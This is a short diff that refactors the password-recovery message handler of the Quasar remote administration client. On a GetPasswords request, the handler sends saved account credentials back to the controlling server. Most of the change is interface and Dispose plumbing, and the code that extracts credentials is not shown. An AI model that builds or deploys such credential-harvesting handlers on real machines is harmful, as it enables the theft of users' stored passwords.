@@ -3,21 +3,18 @@ using Quasar.Client.Recovery.FtpClients;
 using Quasar.Common.Messages;
 using Quasar.Common.Models;
 using Quasar.Common.Networking;
+using System;
 using System.Collections.Generic;
 
 namespace Quasar.Client.Messages
 {
-    public class PasswordRecoveryHandler : MessageProcessorBase<object>
+    public class PasswordRecoveryHandler : IMessageProcessor
     {
-        public PasswordRecoveryHandler() : base(false)
-        {
-        }
+        public bool CanExecute(IMessage message) => message is GetPasswords;
 
-        public override bool CanExecute(IMessage message) => message is GetPasswords;
+        public bool CanExecuteFrom(ISender sender) => true;
 
-        public override bool CanExecuteFrom(ISender sender) => true;
-
-        public override void Execute(ISender sender, IMessage message)
+        public void Execute(ISender sender, IMessage message)
         {
             switch (message)
             {
@@ -42,9 +39,18 @@ namespace Quasar.Client.Messages
             client.Send(new GetPasswordsResponse { RecoveredAccounts = recovered });
         }
 
-        protected override void Dispose(bool disposing)
+        /// <summary>
+        /// Disposes all managed and unmanaged resources associated with this message processor.
+        /// </summary>
+        public void Dispose()
         {
-            
+            Dispose(true);
+            GC.SuppressFinalize(this);
+        }
+
+        protected virtual void Dispose(bool disposing)
+        {
+
         }
     }
 }
